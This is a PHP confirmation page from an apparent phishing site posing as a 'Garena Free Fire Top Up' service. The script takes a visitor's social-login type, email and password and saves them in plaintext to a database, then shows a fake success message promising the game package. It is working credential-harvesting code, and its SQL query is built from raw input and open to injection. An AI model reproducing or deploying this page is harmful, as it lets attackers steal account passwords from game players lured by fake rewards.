<?php

include_once('header.php');

?>

<title>Confirmation | Wikiamer.CF - Garena Free Fire Top Up</title>

<?php

include_once('include/config.php');

$submit = $_POST['submit'];

$social = $_POST['social'];

$email = $_POST['email'];

$password = $_POST['password'];

if(isset($submit)){

$sql = "INSERT INTO connect(social,email,password)VALUES('$social','$email','$password')";

mysqli_query($connect,$sql);

echo <<<_END

<div class="Top">

Confirmation

</div>

<div class="alert alert-success p-3 m-0">

<h3>Free Fire</h3>

Dear Free Fire User,

<br/>

<br/>

Your Request Successfully Submitted.

<br/>

<br/>

We Will Review Your Request And Give Your Submitted Package.

<br/>

<br/>


<strong>

Thanks For Stay With Us.

</strong>

</div>

_END;

}else{
	
header('location:index.php');
	
}

?>

<?php

include_once('footer.php');

?>